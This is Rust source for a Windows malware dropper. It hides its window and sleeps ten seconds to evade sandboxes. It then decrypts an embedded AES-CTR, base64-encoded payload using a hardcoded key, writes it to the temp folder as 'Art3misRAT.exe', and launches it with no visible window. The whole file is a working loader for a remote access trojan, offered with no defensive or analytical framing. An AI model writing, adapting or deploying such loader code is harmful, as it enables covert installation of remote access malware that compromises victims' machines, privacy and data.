#![windows_subsystem = "windows"]

use std::env;
use std::fs::{File};
use std::io::Write;
use std::process::Command;
use aes::Aes256;
use ctr::cipher::{NewCipher, StreamCipher};
use aes::cipher::generic_array::GenericArray;

use std::os::windows::process::CommandExt;

const AES_KEY: &[u8; 32] = b"YWG88ggzyYZkxMhhc9lOZzpaR21GlC0K";
const AES_NONCE: &[u8; 16] = b"t0MQeRPju1IiYYqW";  // 16 bytes nonce

include!(concat!(env!("CARGO_MANIFEST_DIR"), "/art3misrat_chunks.rs"));

fn main() {
    // Sleep for 10 seconds
    std::thread::sleep(std::time::Duration::from_secs(10));

    // Decrypt the encrypted data
    let encrypted_data: String = ENCRYPTED_DATA.concat();
    let encrypted_bytes = base64::decode(&encrypted_data).expect("Failed to decode base64 data");
    let decrypted_bytes = decrypt(&encrypted_bytes).expect("Failed to decrypt data");

    // Write the decrypted data to a temporary file and execute it
    let temp_dir = env::temp_dir();
    let exe_path = temp_dir.join("Art3misRAT.exe");

    // Write the executable to the temporary directory
    {
        let mut exe_file = File::create(&exe_path).expect("Failed to create executable file");
        exe_file.write_all(&decrypted_bytes).expect("Failed to write executable");
    } // The file is closed here because the scope of `exe_file` ends

    // Execute the RAT without showing a window
    Command::new(exe_path.to_str().unwrap())
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn()
        .expect("Failed to execute RAT");
}

fn decrypt(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let key = GenericArray::from_slice(AES_KEY);
    let nonce = GenericArray::from_slice(AES_NONCE);
    let mut cipher = ctr::Ctr128BE::<Aes256>::new(&key, &nonce);
    let mut buffer = data.to_vec();
    cipher.apply_keystream(&mut buffer);

    Ok(buffer)
}
